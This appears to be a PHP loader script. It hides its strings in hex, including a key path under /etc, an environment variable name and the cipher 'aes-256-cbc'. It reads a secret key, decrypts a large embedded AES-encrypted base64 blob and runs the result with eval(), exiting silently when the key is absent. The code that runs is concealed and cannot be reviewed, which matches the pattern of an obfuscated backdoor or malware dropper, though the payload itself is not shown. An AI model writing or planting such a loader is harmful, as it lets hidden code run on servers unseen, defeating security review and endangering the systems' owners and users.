<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TJKsYE+R7+jIKoZtXaHBMA==');

$c=base64_decode(

'hgX4Iao8OA50uecfnobObkQyHbKPK2xM65zoze+MIVXaJHTjxCTBJ/VPEicw0xmFCGH625XsdNSs' .
'3+U10quRzhiKtuxD02Z2xZkrYXqOvj4axdwfLn4hxeq3+EKhNIIkkYBHtHbIfjhUmaSsVVQ+wMUG' .
'A3lf4XR1/aTiGP7Xpb5pF+MdkXFRGGx2A+nm+/wxDe81tP5Q4SPb/5d5SE+w1rZyO/6LRo3E9zFZ' .
'cappqX04G8EGrWusf49x3/OCMCO17KPk7LUwzLHJMvaDseMiuthgfvm/MHW59Ma5TFpYq6pSl2cC' .
'RzbygKdVD3o4+TOpuusq6O593g+DT0CEPXjAsnnMvzoTfvkK5nxrYe5SDR1bGRNhb1bJUsP0jFUX' .
'EOi7Z5G/YU2gITaEmDqliNANfvxDJYHm3Bl7tP671FX7CIcrLExb17h+6zqs36XhPeKmWnG942wd' .
'VwzEUmnZHYTG9IEMtUHk6gKddxfroQsCuqlE9BxPgdiSQT+gihOTqn8pPTuttzxySrS4QR/AUaR1' .
'jIuO68lEcy1REc2Qu+PIQTDWJPPXc3VEYRuubxx2hoTKm6a7OsZpSMqRPfom69E8DqgLgCCiFXil' .
'qKmF9mQMDaTS1nJv7DL1up0vNkCOjShjZe9rUApG3DBENp61igBXlivE00lm5xp3ghl++R46EyDy' .
'rOnPA2dIjVuHtatGZBxxqDScpv0L4nkyaWiG1yqZzDTnAvkBb+Bmvn9LEX1VmfaLr0YCi5LQYp2h' .
'moVkYRPKcL84ZxbhHT+oiPVKP7yH2pOHQHsXm2VHXjpnC1lKPLkbwilLRDfA1s3kMphyVbhlJtar' .
'wttJlB3ppg7XuBcCEQ1rhmMiaynV9sX2+jzFIB3gukW+BZXeQKT0xxdKXNbd3W/B2uP+K9u6cUeS' .
'tiNdq2wKm3Tip96nqvq1Yb0Jlyj1mitmXMVOY4AU1es/75zzsMWGMA6H3nQWsttT7ZAkV5rtQ1bd' .
'Iv/8lTjqyxRHYprDQ79Dty/J0LLjKUmDICYe2xv4DpVvve802478YsfYUswHKySsIuKcrb4Pubow' .
'FVltGY9Qxp9DYPljVcPe41S1NZZIENMlgzsn2hti4UZYcDEkggP9IAp51MRpx7wY82UbMmNtDN7o' .
'c79KGwzV40+1Eo0KJRTonhvikmzx9ZNdXvZJ8jIB3WIHjZ8rGEIayldWnIWicGdrMKFAuM6ctIUK' .
'yln1BNXyihcLoq3l6sIOD1BZL2/LvcwLTvD+aQedK4iqWaFDwmcpRnsGRIqDdvOGKZYCZ9S2Nma6' .
'ByAuMkuDkm2WOFc2GVsKr7xjGkJli34Y9tkDaCmM2spVgJlgDGo2nvCkHzrSnYALvtcFew9aXQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

